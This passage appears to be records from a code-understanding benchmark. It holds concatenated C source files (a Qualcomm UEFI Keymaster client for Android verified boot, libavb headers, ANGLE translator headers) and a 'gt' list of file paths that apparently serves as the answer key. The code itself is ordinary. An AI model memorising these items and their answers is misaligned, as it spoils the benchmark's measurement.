avb_descriptor_foreach(const uint8_t* image_data,\n                            size_t image_size,\n                            AvbDescriptorForeachFunc foreach_func,\n                            void* user_data);\n\n\nconst AvbDescriptor** avb_descriptor_get_all(const uint8_t* image_data,\n                                             size_t image_size,\n                                             size_t* out_num_descriptors)\n    AVB_ATTR_WARN_UNUSED_RESULT;\n\n#ifdef __cplusplus\n}\n#endif\n\n#endif\n\n'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/KeymasterClient.c'\n:\n#include \"KeymasterClient.h\"\n#include \"VerifiedBoot.h\"\n#include \"libavb/libavb.h\"\n#include <Library/BaseMemoryLib.h>\n#include <Library/DebugLib.h>\n#include <Library/UefiBootServicesTableLib.h>\n#include <Library/UefiRuntimeServicesTableLib.h>\n#include <Protocol/EFIQseecom.h>\n#include <Protocol/LoadedImage.h>\n#include <Protocol/scm_sip_interface.h>\n\ntypedef struct {\n  QCOM_QSEECOM_PROTOCOL *QseeComProtocol;\n  UINT32 AppId;\n} KMHandle;\n\n\n#define KEYMASTER_CMD_ID_OLD 0UL\n#define KEYMASTER_CMD_ID 0x100UL\n#define KEYMASTER_UTILS_CMD_ID 0x200UL\n#define GK_CMD_ID 0x1000UL\n\ntypedef enum {\n\n  KEYMASTER_GET_SUPPORTED_ALGORITHMS = (KEYMASTER_CMD_ID + 1UL),\n  KEYMASTER_GET_SUPPORTED_BLOCK_MODES = (KEYMASTER_CMD_ID + 2UL),\n  KEYMASTER_GET_SUPPORTED_PADDING_MODES = (KEYMASTER_CMD_ID + 3UL),\n  KEYMASTER_GET_SUPPORTED_DIGESTS = (KEYMASTER_CMD_ID + 4UL),\n  KEYMASTER_GET_SUPPORTED_IMPORT_FORMATS = (KEYMASTER_CMD_ID + 5UL),\n  KEYMASTER_GET_SUPPORTED_EXPORT_FORMATS = (KEYMASTER_CMD_ID + 6UL),\n  KEYMASTER_ADD_RNG_ENTROPY = (KEYMASTER_CMD_ID + 7UL),\n  KEYMASTER_GENERATE_KEY = (KEYMASTER_CMD_ID + 8UL),\n  KEYMASTER_GET_KEY_CHARACTERISTICS = (KEYMASTER_CMD_ID + 9UL),\n  KEYMASTER_RESCOPE = (KEYMASTER_CMD_ID + 10UL),\n  KEYMASTER_IMPORT_KEY = (KEYMASTER_CMD_ID + 11UL),\n  KEYMASTER_EXPORT_KEY = (KEYMASTER_CMD_ID + 12UL),\n  KEYMASTER_DELETE_KEY = (KEYMASTER_CMD_ID + 13UL),\n  KEYMASTER_DELETE_ALL_KEYS = (KEYMASTER_CMD_ID + 14UL),\n  KEYMASTER_BEGIN = (KEYMASTER_CMD_ID + 15UL),\n  KEYMASTER_UPDATE = (KEYMASTER_CMD_ID + 17UL),\n  KEYMASTER_FINISH = (KEYMASTER_CMD_ID + 18UL),\n  KEYMASTER_ABORT = (KEYMASTER_CMD_ID + 19UL),\n  KEYMASTER_UPGRADE = (KEYMASTER_CMD_ID + 20UL),\n  KEYMASTER_ATTEST = (KEYMASTER_CMD_ID + 21UL),\n  KEYMASTER_CONFIGURE = (KEYMASTER_CMD_ID + 22UL),\n\n  KEYMASTER_GET_VERSION = (KEYMASTER_UTILS_CMD_ID + 0UL),\n  KEYMASTER_SET_ROT = (KEYMASTER_UTILS_CMD_ID + 1UL),\n  KEYMASTER_READ_KM_DEVICE_STATE = (KEYMASTER_UTILS_CMD_ID + 2UL),\n  KEYMASTER_WRITE_KM_DEVICE_STATE = (KEYMASTER_UTILS_CMD_ID + 3UL),\n  KEYMASTER_MILESTONE_CALL = (KEYMASTER_UTILS_CMD_ID + 4UL),\n  KEYMASTER_GET_AUTH_TOKEN_KEY = (KEYMASTER_UTILS_CMD_ID + 5UL),\n  KEYMASTER_SECURE_WRITE_PROTECT = (KEYMASTER_UTILS_CMD_ID + 6UL),\n  KEYMASTER_SET_VERSION = (KEYMASTER_UTILS_CMD_ID + 7UL),\n  KEYMASTER_SET_BOOT_STATE = (KEYMASTER_UTILS_CMD_ID + 8UL),\n  KEYMASTER_PROVISION_ATTEST_KEY = (KEYMASTER_UTILS_CMD_ID + 9UL),\n  KEYMASTER_SET_VBH = (KEYMASTER_UTILS_CMD_ID + 17UL),\n  KEYMASTER_GET_DATE_SUPPORT = (KEYMASTER_UTILS_CMD_ID + 21UL),\n\n  KEYMASTER_LAST_CMD_ENTRY = (int)0xFFFFFFFFULL\n} KeyMasterCmd;\n\ntypedef enum {\n  KM_ERROR_INVALID_TAG = -40,\n} KeyMasterError;\n\ntypedef struct {\n  UINT32 CmdId;\n  UINT32 RotOffset;\n  UINT32 RotSize;\n  CHAR8 RotDigest[AVB_SHA256_DIGEST_SIZE];\n} __attribute__ ((packed)) KMSetRotReq;\n\ntypedef struct {\n  INT32 Status;\n} __attribute__ ((packed)) KMSetRotRsp;\n\ntypedef struct {\n  UINT32 IsUnlocked;\n  CHAR8 PublicKey[AVB_SHA256_DIGEST_SIZE];\n  UINT32 Color;\n  UINT32 SystemVersion;\n  UINT32 SystemSecurityLevel;\n} __attribute__ ((packed)) KMBootState;\n\ntypedef struct {\n  UINT32 CmdId;\n  UINT32 Version;\n  UINT32 Offset;\n  UINT32 Size;\n  KMBootState BootState;\n} __attribute__ ((packed)) KMSetBootStateReq;\n\ntypedef struct {\n  INT32 Status;\n} __attribute__ ((packed)) KMSetBootStateRsp;\n\ntypedef struct {\n  UINT32 CmdId;\n} __attribute__ ((packed)) KMGetVersionReq;\n\ntypedef struct {\n  INT32 Status;\n  UINT32 Major;\n  UINT32 Minor;\n  UINT32 AppMajor;\n  UINT32 AppMinor;\n} __attribute__ ((packed)) KMGetVersionRsp;\n\ntypedef struct\n{\n  UINT32 CmdId;\n  CHAR8 Vbh[AVB_SHA256_DIGEST_SIZE];\n} __attribute__ ((packed)) KMSetVbhReq;\n\ntypedef struct\n{\n  INT32 Status;\n} __attribute__ ((packed)) KMSetVbhRsp;\n\ntypedef struct {\n  UINT32 CmdId;\n} __attribute__ ((packed)) KMGetDateSupportReq;\n\ntypedef struct {\n  INT32 Status;\n} __attribute__ ((packed)) KMGetDateSupportRsp;\n\nEFI_STATUS\nKeyMasterStartApp (KMHandle *Handle)\n{\n  EFI_STATUS Status = EFI_SUCCESS;\n  KMGetVersionReq Req = {0};\n  KMGetVersionRsp Rsp = {0};\n\n  if (Handle == NULL) {\n    DEBUG ((EFI_D_ERROR, \"KeyMasterStartApp: Invalid Handle\\n\"));\n    return EFI_INVALID_PARAMETER;\n  }\n\n  Status = gBS->LocateProtocol (&gQcomQseecomProtocolGuid, NULL,\n                                (VOID **)&(Handle->QseeComProtocol));\n  if (Status != EFI_SUCCESS) {\n    DEBUG ((EFI_D_ERROR, \"Unable to locate QSEECom protocol: %r\\n\", Status));\n    return Status;\n  }\n\n  Status = Handle->QseeComProtocol->QseecomStartApp (\n      Handle->QseeComProtocol, \"keymaster\", &(Handle->AppId));\n  if (Status != EFI_SUCCESS) {\n    DEBUG ((EFI_D_ERROR,\n            \"KeyMasterStartApp: QseecomStartApp failed status: %r\\n\", Status));\n    return Status;\n  }\n\n  DEBUG ((EFI_D_VERBOSE, \"keymaster app id %d\\n\", Handle->AppId));\n\n  Req.CmdId = KEYMASTER_GET_VERSION;\n  Status = Handle->QseeComProtocol->QseecomSendCmd (\n      Handle->QseeComProtocol, Handle->AppId, (UINT8 *)&Req, sizeof (Req),\n      (UINT8 *)&Rsp, sizeof (Rsp));\n  if (Status != EFI_SUCCESS || Rsp.Status != 0 || Rsp.Major < 2) {\n    DEBUG ((EFI_D_ERROR, \"KeyMasterStartApp: Get Version err, status: \"\n                         \"%d, response status: %d, Major: %d\\n\",\n            Status, Rsp.Status, Rsp.Major));\n    return EFI_LOAD_ERROR;\n  }\n  DEBUG ((EFI_D_VERBOSE, \"KeyMasterStartApp success AppId: 0x%x, Major: %d\\n\",\n          Handle->AppId, Rsp.Major));\n  return Status;\n}\n\nEFI_STATUS\nKeyMasterSetRotAndBootState (KMRotAndBootState *BootState)\n{\n  EFI_STATUS Status = EFI_SUCCESS;\n  CHAR8 *RotDigest = NULL;\n  CHAR8 *BootStateDigest = NULL;\n  CHAR8 BootStateOrgangeDigest[AVB_SHA256_DIGEST_SIZE] = {0};\n  AvbSHA256Ctx RotCtx;\n  AvbSHA256Ctx BootStateCtx;\n  KMHandle Handle = {NULL};\n  KMSetRotReq RotReq = {0};\n  KMSetRotRsp RotRsp = {0};\n  KMSetBootStateReq BootStateReq = {0};\n  KMSetBootStateRsp BootStateRsp = {0};\n  BOOLEAN secure_device = FALSE;\n\n  if (BootState == NULL) {\n    DEBUG ((EFI_D_ERROR, \"Invalid parameter BootState\\n\"));\n    return EFI_INVALID_PARAMETER;\n  }\n\n\n  avb_sha256_init (&RotCtx);\n\n  switch (BootState->Color) {\n  case GREEN:\n  case YELLOW:\n    avb_sha256_update (&RotCtx, (const uint8_t *)BootState->PublicKey,\n                       BootState->PublicKeyLength);\n    avb_sha256_update (&RotCtx, (const uint8_t *)&BootState->IsUnlocked,\n                       sizeof (BootState->IsUnlocked));\n    break;\n  case ORANGE:\n    avb_sha256_update (&RotCtx, (const uint8_t *)&BootState->IsUnlocked,\n                       sizeof (BootState->IsUnlocked));\n    break;\n  case RED:\n  default:\n    DEBUG ((EFI_D_ERROR, \"Invalid state to boot!\\n\"));\n    return EFI_LOAD_ERROR;\n  }\n\n  RotDigest = (CHAR8 *)avb_sha256_final (&RotCtx);\n\n\n  switch (BootState->Color) {\n  case GREEN:\n  case YELLOW:\n    avb_sha256_init (&BootStateCtx);\n    avb_sha256_update (&BootStateCtx, (const uint8_t *)BootState->PublicKey,\n                       BootState->PublicKeyLength);\n\n    BootStateDigest = (CHAR8 *)avb_sha256_final (&BootStateCtx);\n    break;\n  case ORANGE:\n    BootStateDigest = BootStateOrgangeDigest;\n    break;\n  case RED:\n  default:\n    DEBUG ((EFI_D_ERROR, \"Invalid state to boot!\\n\"));\n    return EFI_LOAD_ERROR;\n  }\n\n\n  GUARD (KeyMasterStartApp (&Handle));\n\n\n  RotReq.CmdId = KEYMASTER_SET_ROT;\n  RotReq.RotOffset = (UINT8 *)&RotReq.RotDigest - (UINT8 *)&RotReq;\n  RotReq.RotSize = sizeof (RotReq.RotDigest);\n  CopyMem (RotReq.RotDigest, RotDigest, AVB_SHA256_DIGEST_SIZE);\n\n  Status = Handle.QseeComProtocol->QseecomSendCmd (\n      Handle.QseeComProtocol, Handle.AppId, (UINT8 *)&RotReq, sizeof (RotReq),\n      (UINT8 *)&RotRsp, sizeof (RotRsp));\n  if (Status != EFI_SUCCESS || RotRsp.Status != 0) {\n    DEBUG ((EFI_D_ERROR, \"KeyMasterSendRotAndBootState: Set ROT err, \"\n                         \"Status: %r, response status: %d\\n\",\n            Status, RotRsp.Status));\n    return EFI_LOAD_ERROR;\n  }\n\n\n  BootStateReq.CmdId = KEYMASTER_SET_BOOT_STATE;\n  BootStateReq.Version = 0;\n  BootStateReq.Size = sizeof (BootStateReq.BootState);\n  BootStateReq.Offset =\n      (UINT8 *)&BootStateReq.BootState - (UINT8 *)&BootStateReq;\n  BootStateReq.BootState.Color = BootState->Color;\n  BootStateReq.BootState.IsUnlocked = BootState->IsUnlocked;\n  BootStateReq.BootState.SystemSecurityLevel = BootState->SystemSecurityLevel;\n  BootStateReq.BootState.SystemVersion = BootState->SystemVersion;\n  CopyMem (BootStateReq.BootState.PublicKey, BootStateDigest,\n           AVB_SHA256_DIGEST_SIZE);\n\n  Status = Handle.QseeComProtocol->QseecomSendCmd (\n      Handle.QseeComProtocol, Handle.AppId, (UINT8 *)&BootStateReq,\n      sizeof (BootStateReq), (UINT8 *)&BootStateRsp, sizeof (BootStateRsp));\n  if (Status != EFI_SUCCESS || BootStateRsp.Status != 0) {\n    DEBUG ((EFI_D_ERROR, \"KeyMasterSendRotAndBootState: Set BootState err, \"\n                         \"Status: %r, response status: %d\\n\",\n            Status, BootStateRsp.Status));\n    return EFI_LOAD_ERROR;\n  }\n\n\n  if (((Status = IsSecureDevice (&secure_device)) == EFI_SUCCESS) &&\n      secure_device && (BootState->Color != GREEN)) {\n    if (AllowSetFuse ()) {\n      Status = SetFuse (TZ_HLOS_IMG_TAMPER_FUSE);\n      if (Status != EFI_SUCCESS) {\n        DEBUG ((EFI_D_ERROR, \"KeyMasterSetRotAndBootState: \"\n                             \"SetFuse (TZ_HLOS_IMG_TAMPER_FUSE) fails!\\n\"));\n        return Status;\n      }\n      Status = SetFuse (TZ_HLOS_TAMPER_NOTIFY_FUSE);\n      if (Status != EFI_SUCCESS) {\n        DEBUG ((EFI_D_ERROR, \"KeyMasterSetRotAndBootState: \"\n                             \"SetFuse (TZ_HLOS_TAMPER_NOTIFY_FUSE) fails!\\n\"));\n        return Status;\n      }\n    }\n  }\n  DEBUG ((EFI_D_VERBOSE, \"KeyMasterSetRotAndBootState success\\n\"));\n  return Status;\n}\n\nEFI_STATUS\nSetVerifiedBootHash (CONST CHAR8 *Vbh, UINTN VbhSize)\n{\n  EFI_STATUS Status = EFI_SUCCESS;\n  KMSetVbhReq VbhReq = {0};\n  KMSetVbhRsp VbhRsp = {0};\n  KMHandle Handle = {NULL};\n\n  if (!Vbh ||\n      VbhSize != sizeof (VbhReq.Vbh)) {\n    DEBUG ((EFI_D_ERROR, \"Vbh input params invalid\\n\"));\n    return EFI_INVALID_PARAMETER;\n  }\n\n\n  GUARD (KeyMasterStartApp (&Handle));\n  VbhReq.CmdId = KEYMASTER_SET_VBH;\n  CopyMem (VbhReq.Vbh, Vbh, VbhSize);\n\n  Status = Handle.QseeComProtocol->QseecomSendCmd (\n      Handle.QseeComProtocol, Handle.AppId, (UINT8 *)&VbhReq,\n      sizeof (VbhReq), (UINT8 *)&VbhRsp, sizeof (VbhRsp));\n  if (Status != EFI_SUCCESS ||\n                VbhRsp.Status != 0) {\n    DEBUG ((EFI_D_ERROR, \"Set Vbh Error, \"\n                         \"Status: %r, response status: %d\\n\",\n            Status, VbhRsp.Status));\n    if (Status == EFI_SUCCESS &&\n                VbhRsp.Status == KM_ERROR_INVALID_TAG) {\n      DEBUG ((EFI_D_ERROR, \"VBH not supported in keymaster\\n\"));\n      return EFI_SUCCESS;\n    }\n    return EFI_LOAD_ERROR;\n  }\n  return EFI_SUCCESS;\n}\n\nEFI_STATUS\nKeyMasterGetDateSupport (BOOLEAN *Supported)\n{\n  EFI_STATUS Status = EFI_SUCCESS;\n  KMGetDateSupportReq Req = {0};\n  KMGetDateSupportRsp Rsp = {0};\n  KMHandle Handle = {NULL};\n\n  GUARD (KeyMasterStartApp (&Handle));\n  Req.CmdId = KEYMASTER_GET_DATE_SUPPORT;\n  Status = Handle.QseeComProtocol->QseecomSendCmd (\n      Handle.QseeComProtocol, Handle.AppId, (UINT8 *)&Req, sizeof (Req),\n      (UINT8 *)&Rsp, sizeof (Rsp));\n  if (Status != EFI_SUCCESS ||\n                Rsp.Status != 0 ) {\n    DEBUG ((EFI_D_ERROR, \"Keymaster: Get date support error, status: \"\n                         \"%d, response status: %d\\n\",\n            Status, Rsp.Status));\n    if (Status == EFI_SUCCESS &&\n                Rsp.Status == KM_ERROR_INVALID_TAG) {\n      DEBUG ((EFI_D_ERROR, \"Date in patch level not supported in keymaster\\n\"));\n      *Supported = FALSE;\n      return EFI_SUCCESS;\n    }\n    return EFI_LOAD_ERROR;\n  }\n\n  *Supported = TRUE;\n  return Status;\n}\n\n'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/libavb/avb_sysdeps.h'\n:\n\n#if !defined(AVB_INSIDE_LIBAVB_H) && !defined(AVB_COMPILATION)\n#error \"Never include this file directly, include libavb.h instead.\"\n#endif\n\n#ifndef AVB_SYSDEPS_H_\n#define AVB_SYSDEPS_H_\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n#include <Base.h>\n\n#define true ((BOOLEAN) (1 == 1))\n#define false ((BOOLEAN) (0 == 1))\n\ntypedef BOOLEAN bool;\ntypedef UINT8 uint8_t;\ntypedef UINT16 uint16_t;\ntypedef UINT32 uint32_t;\ntypedef UINT64 uint64_t;\ntypedef UINTN uintptr_t;\ntypedef UINTN size_t;\ntypedef INT64 int64_t;\n\n\n#define AVB_ATTR_WARN_UNUSED_RESULT __attribute__((warn_unused_result))\n#define AVB_ATTR_PACKED __attribute__((packed))\n#define AVB_ATTR_NO_RETURN __attribute__((noreturn))\n#define AVB_ATTR_SENTINEL __attribute__((__sentinel__))\n\n\n#ifdef __LP64__\n#define AVB_ALIGNMENT_SIZE 8\n#else\n#define AVB_ALIGNMENT_SIZE 4\n#endif\n\n\nint avb_memcmp(const void* src1,\n               const void* src2,\n               size_t n) AVB_ATTR_WARN_UNUSED_RESULT;\n\n\nint avb_strcmp(const char* s1, const char* s2);\n\nint Avb_StrnCmp (CONST CHAR8* s1, CONST CHAR8* s2, UINTN Len);\n\n\nvoid* avb_memcpy(void* dest, const void* src, size_t n);\n\n\nvoid* avb_memset(void* dest, const int c, size_t n);\n\n\nvoid avb_print(UINTN ErrorLevel, const char* message);\n\n\nvoid avb_printv(UINTN ErrorLevel, const char* message, ...) AVB_ATTR_SENTINEL;\n\n\nvoid avb_abort(void);\n\n\nvoid* avb_malloc_(size_t size) AVB_ATTR_WARN_UNUSED_RESULT;\n\n\nvoid avb_free(void* ptr);\n\n\nsize_t avb_strlen(const char* str) AVB_ATTR_WARN_UNUSED_RESULT;\n\n#ifdef __cplusplus\n}\n#endif\n\n#endif\n",
        "gt": [
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/libavb/avb_sysdeps.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/libavb/avb_descriptor.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/libavb/avb_hash_descriptor.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/libavb/libavb.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/KeymasterClient.c'"
        ]
    },
    {
        "files": [
            "'freshplayerplugin/3rdparty/angle/src/compiler/translator/InfoSink.h'",
            "'freshplayerplugin/3rdparty/angle/src/compiler/translator/Common.h'",
            "'freshplayerplugin/3rdparty/angle/src/common/debug.h'",
            "'freshplayerplugin/3rdparty/angle/src/compiler/translator/SymbolTable.h'",
            "'freshplayerplugin/3rdparty/angle/src/compiler/translator/Initialize.h'"
        ],
        "content": "'freshplayerplugin/3rdparty/angle/src/compiler/translator/InfoSink.h'\n:\n\n\n\n\n\n#ifndef COMPILER_TRANSLATOR_INFOSINK_H_\n#define COMPILER_TRANSLATOR_INFOSINK_H_\n\n#include <math.h>\n#include <stdlib.h>\n#include \"compiler/translator/Common.h\"\n\n\ninline float fractionalPart(float f) {\n  float intPart = 0.0f;\n  return modff(f, &intPart);\n}\n\n\n\n\n\nenum TPrefixType {\n    EPrefixNone,\n    EPrefixWarning,\n    EPrefixError,\n    EPrefixInternalError,\n    EPrefixUnimplemented,\n    EPrefixNote\n};\n\n\n\n\n\n\n\nclass TInfoSinkBase {\npublic:\n    TInfoSinkBase() {}\n\n    template <typename T>\n    TInfoSinkBase& operator<<(const T& t) {\n        TPersistStringStream stream;\n        stream << t;\n        sink.append(stream.str());\n        return *this;\n    }\n\n\n    TInfoSinkBase& operator<<(char c) {\n        sink.append(1, c);\n        return *this;\n    }\n    TInfoSinkBase& operator<<(const char* str) {\n        sink.append(str);\n        return *this;\n    }\n    TInfoSinkBase& operator<<(const TPersistString& str) {\n        sink.append(str);\n        return *this;\n    }\n    TInfoSinkBase& operator<<(const TString& str) {\n        sink.append(str.c_str());\n        return *this;\n    }\n\n    TInfoSinkBase& operator<<(float f) {\n\n\n\n\n        TPersistStringStream stream;\n        if (fractionalPart(f) == 0.0f) {\n            stream.precision(1);\n            stream << std::showpoint << std::fixed << f;\n        } else {\n            stream.unsetf(std::ios::fixed);\n            stream.unsetf(std::ios::scientific);\n            stream.precision(8);\n            stream << f;\n        }\n        sink.append(stream.str());\n        return *this;\n    }\n\n    TInfoSinkBase& operator<<(bool b) {\n        const char* str = b ? \"true\" : \"false\";\n        sink.append(str);\n        return *this;\n    }\n\n    void erase() { sink.clear(); }\n    int size() { return static_cast<int>(sink.size()); }\n\n    const TPersistString& str() const { return sink; }\n    const char* c_str() const { return sink.c_str(); }\n\n    void prefix(TPrefixType p);\n    void location(int file, int line);\n    void location(const TSourceLoc& loc);\n    void message(TPrefixType p, const TSourceLoc& loc, const char* m);\n\nprivate:\n    TPersistString sink;\n};\n\nclass TInfoSink {\npublic:\n    TInfoSinkBase info;\n    TInfoSinkBase debug;\n    TInfoSinkBase obj;\n};\n\n#endif\n\n'freshplayerplugin/3rdparty/angle/src/compiler/translator/Common.h'\n:\n\n\n\n\n\n#ifndef COMPILER_TRANSLATOR_COMMON_H_\n#define COMPILER_TRANSLATOR_COMMON_H_\n\n#include <map>\n#include <sstream>\n#include <string>\n#include <vector>\n#include <limits>\n#include <stdio.h>\n\n#include \"common/angleutils.h\"\n#include \"common/debug.h\"\n#include \"compiler/translator/PoolAlloc.h\"\n\nstruct TSourceLoc {\n    int first_file;\n    int first_line;\n    int last_file;\n    int last_line;\n};\n\n\n\n\n#define POOL_ALLOCATOR_NEW_DELETE()                                                  \\\n    void* operator new(size_t s) { return GetGlobalPoolAllocator()->allocate(s); }   \\\n    void* operator new(size_t, void *_Where) { return (_Where); }                    \\\n    void operator delete(void*) { }                                                  \\\n    void operator delete(void *, void *) { }                                         \\\n    void* operator new[](size_t s) { return GetGlobalPoolAllocator()->allocate(s); } \\\n    void* operator new[](size_t, void *_Where) { return (_Where); }                  \\\n    void operator delete[](void*) { }                                                \\\n    void operator delete[](void *, void *) { }\n\n\n\n\ntypedef pool_allocator<char> TStringAllocator;\ntypedef std::basic_string <char, std::char_traits<char>, TStringAllocator> TString;\ntypedef std::basic_ostringstream<char, std::char_traits<char>, TStringAllocator> TStringStream;\ninline TString* NewPoolTString(const char* s)\n{\n\tvoid* memory = GetGlobalPoolAllocator()->allocate(sizeof(TString));\n\treturn new(memory) TString(s);\n}\n\n\n\n\n\n#define TPersistString std::string\n#define TPersistStringStream std::ostringstream\n\n\n\n\ntemplate <class T> class TVector : public std::vector<T, pool_allocator<T> > {\npublic:\n    typedef typename std::vector<T, pool_allocator<T> >::size_type size_type;\n    TVector() : std::vector<T, pool_allocator<T> >() {}\n    TVector(const pool_allocator<T>& a) : std::vector<T, pool_allocator<T> >(a) {}\n    TVector(size_type i): std::vector<T, pool_allocator<T> >(i) {}\n};\n\ntemplate <class K, class D, class CMP = std::less<K> >\nclass TMap : public std::map<K, D, CMP, pool_allocator<std::pair<const K, D> > > {\npublic:\n    typedef pool_allocator<std::pair<const K, D> > tAllocator;\n\n    TMap() : std::map<K, D, CMP, tAllocator>() {}\n\n    TMap(const tAllocator& a) : std::map<K, D, CMP, tAllocator>(std::map<K, D, CMP, tAllocator>::key_compare(), a) {}\n};\n\n\ntemplate <typename T>\ninline TString str(T i)\n{\n    ASSERT(std::numeric_limits<T>::is_integer);\n    char buffer[((8 * sizeof(T)) / 3) + 3];\n    const char *formatStr = std::numeric_limits<T>::is_signed ? \"%d\" : \"%u\";\n    snprintf(buffer, sizeof(buffer), formatStr, i);\n    return buffer;\n}\n\n#endif\n\n'freshplayerplugin/3rdparty/angle/src/common/debug.h'\n:\n\n\n\n\n\n\n\n#ifndef COMMON_DEBUG_H_\n#define COMMON_DEBUG_H_\n\n#include <assert.h>\n#include <stdio.h>\n#include <string>\n\n#include \"common/angleutils.h\"\n\n#if !defined(TRACE_OUTPUT_FILE)\n#define TRACE_OUTPUT_FILE \"debug.txt\"\n#endif\n\nnamespace gl\n{\n\nenum MessageType\n{\n    MESSAGE_TRACE,\n    MESSAGE_FIXME,\n    MESSAGE_ERR,\n    MESSAGE_EVENT,\n};\n\n\nvoid trace(bool traceInDebugOnly, MessageType messageType, const char *format, ...);\n\n\nclass ScopedPerfEventHelper : angle::NonCopyable\n{\n  public:\n    ScopedPerfEventHelper(const char* format, ...);\n    ~ScopedPerfEventHelper();\n};\n\n\nclass DebugAnnotator : angle::NonCopyable\n{\n  public:\n    DebugAnnotator() { };\n    virtual ~DebugAnnotator() { };\n    virtual void beginEvent(const wchar_t *eventName) = 0;\n    virtual void endEvent() = 0;\n    virtual void setMarker(const wchar_t *markerName) = 0;\n    virtual bool getStatus() = 0;\n};\n\nvoid InitializeDebugAnnotations(DebugAnnotator *debugAnnotator);\nvoid UninitializeDebugAnnotations();\nbool DebugAnnotationsActive();\n\n}\n\n#if defined(ANGLE_ENABLE_DEBUG_TRACE) || defined(ANGLE_ENABLE_DEBUG_ANNOTATIONS)\n#define ANGLE_TRACE_ENABLED\n#endif\n\n#define ANGLE_EMPTY_STATEMENT for (;;) break\n\n\n#if defined(ANGLE_TRACE_ENABLED)\n#define TRACE(message, ...) gl::trace(true, gl::MESSAGE_TRACE, \"trace: %s(%d): \" message \"\\n\", __FUNCTION__, __LINE__, ##__VA_ARGS__)\n#else\n#define TRACE(message, ...) (void(0))\n#endif\n\n\n#if defined(ANGLE_TRACE_ENABLED)\n#define FIXME(message, ...) gl::trace(false, gl::MESSAGE_FIXME, \"fixme: %s(%d): \" message \"\\n\", __FUNCTION__, __LINE__, ##__VA_ARGS__)\n#else\n#define FIXME(message, ...) (void(0))\n#endif\n\n\n#if defined(ANGLE_TRACE_ENABLED)\n#define ERR(message, ...) gl::trace(false, gl::MESSAGE_ERR, \"err: %s(%d): \" message \"\\n\", __FUNCTION__, __LINE__, ##__VA_ARGS__)\n#else\n#define ERR(message, ...) (void(0))\n#endif\n\n\n#if defined(ANGLE_TRACE_ENABLED)\n#if defined(_MSC_VER)\n#define EVENT(message, ...) gl::ScopedPerfEventHelper scopedPerfEventHelper ## __LINE__(\"%s\" message \"\\n\", __FUNCTION__, __VA_ARGS__);\n#else\n#define EVENT(message, ...) gl::ScopedPerfEventHelper scopedPerfEventHelper(message \"\\n\", ##__VA_ARGS__);\n#endif\n#else\n#define EVENT(message, ...) (void(0))\n#endif\n\n#if defined(ANGLE_TRACE_ENABLED)\n#undef ANGLE_TRACE_ENABLED\n#endif\n\n\n#if !defined(NDEBUG)\n#define ASSERT(expression) { \\\n    if(!(expression)) \\\n        ERR(\"\\t! Assert failed in %s(%d): \"#expression\"\\n\", __FUNCTION__, __LINE__); \\\n        assert(expression); \\\n    } ANGLE_EMPTY_STATEMENT\n#define UNUSED_ASSERTION_VARIABLE(variable)\n#else\n#define ASSERT(expression) (void(0))\n#define UNUSED_ASSERTION_VARIABLE(variable) ((void)variable)\n#endif\n\n#ifndef ANGLE_ENABLE_DEBUG_TRACE\n#define UNUSED_TRACE_VARIABLE(variable) ((void)variable)\n#else\n#define UNUSED_TRACE_VARIABLE(variable)\n#endif\n\n\n\n#if defined (ANGLE_TEST_CONFIG)\n#define NOASSERT_UNIMPLEMENTED 1\n#endif\n\n\n\n#ifndef NOASSERT_UNIMPLEMENTED\n#define NOASSERT_UNIMPLEMENTED 0\n#endif\n\n#if !defined(NDEBUG)\n#define UNIMPLEMENTED() { \\\n    FIXME(\"\\t! Unimplemented: %s(%d)\\n\", __FUNCTION__, __LINE__); \\\n    assert(NOASSERT_UNIMPLEMENTED); \\\n    } ANGLE_EMPTY_STATEMENT\n#else\n    #define UNIMPLEMENTED() FIXME(\"\\t! Unimplemented: %s(%d)\\n\", __FUNCTION__, __LINE__)\n#endif\n\n\n#if !defined(NDEBUG)\n#define UNREACHABLE() { \\\n    ERR(\"\\t! Unreachable reached: %s(%d)\\n\", __FUNCTION__, __LINE__); \\\n    assert(false); \\\n    } ANGLE_EMPTY_STATEMENT\n#else\n    #define UNREACHABLE() ERR(\"\\t! Unreachable reached: %s(%d)\\n\", __FUNCTION__, __LINE__)\n#endif\n\n#endif\n\n'freshplayerplugin/3rdparty/angle/src/compiler/translator/SymbolTable.h'\n:\n\n\n\n\n\n#ifndef COMPILER_TRANSLATOR_SYMBOLTABLE_H_\n#define COMPILER_TRANSLATOR_SYMBOLTABLE_H_\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#include <assert.h>\n#include <set>\n\n#include \"common/angleutils.h\"\n#include \"compiler/translator/InfoSink.h\"\n#include \"compiler/translator/IntermNode.h\"\n\n\nclass TSymbol : angle::NonCopyable\n{\n  public:\n    POOL_ALLOCATOR_NEW_DELETE();\n    TSymbol(const TString *n)\n        : uniqueId(0),\n          name(n)\n    {\n    }\n    virtual ~TSymbol()\n    {\n\n    }\n\n    const TString &getName() const\n    {\n        return *name;\n    }\n    virtual const TString &getMangledName() const\n    {\n        return getName();\n    }\n    virtual bool isFunction() const\n    {\n        return false;\n    }\n    virtual bool isVariable() const\n    {\n        return false;\n    }\n    void setUniqueId(int id)\n    {\n        uniqueId = id;\n    }\n    int getUniqueId() const\n    {\n        return uniqueId;\n    }\n    void relateToExtension(const TString &ext)\n    {\n        extension = ext;\n    }\n    const TString &getExtension() const\n    {\n        return extension;\n    }\n\n  private:\n    int uniqueId;\n    const TString *name;\n    TString extension;\n};\n\n\n\n\n\n\n\n\n\nclass TVariable : public TSymbol\n{\n  public:\n    TVariable(const TString *name, const TType &t, bool uT = false)\n        : TSymbol(name),\n          type(t),\n          userType(uT),\n          unionArray(0)\n    {\n    }\n    virtual ~TVariable()\n    {\n    }\n    virtual bool isVariable() const\n    {\n        return true;\n    }\n    TType &getType()\n    {\n        return type;\n    }\n    const TType &getType() const\n    {\n        return type;\n    }\n    bool isUserType() const\n    {\n        return userType;\n    }\n    void setQualifier(TQualifier qualifier)\n    {\n        type.setQualifier(qualifier);\n    }\n\n    TConstantUnion *getConstPointer()\n    {\n        if (!unionArray)\n            unionArray = new 